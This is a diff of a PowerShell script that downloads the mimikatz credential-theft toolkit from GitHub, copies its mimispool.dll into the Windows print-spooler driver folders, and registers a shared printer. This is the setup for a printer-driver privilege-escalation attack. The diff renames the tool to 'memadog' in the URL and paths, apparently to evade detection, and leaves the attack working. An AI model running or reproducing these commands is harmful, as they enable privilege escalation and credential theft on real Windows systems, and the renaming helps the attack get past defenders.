@@ -9,12 +9,12 @@ $system32        = $env:systemroot + '\system32'
 $drivers         = $system32 + '\spool\drivers'
 $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
-Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
-Expand-Archive -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'
+Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/memadog/releases/latest/download/memadog_trunk.zip' -OutFile '.\memadog_trunk.zip'
+Expand-Archive -Path '.\memadog_trunk.zip' -DestinationPath '.\memadog_trunk'
 
 Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
-Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
-Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+Copy-Item -Force -Path '.\memadog_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\memadog_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
 Add-PrinterDriver -Name       'Generic / Text Only'
 Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
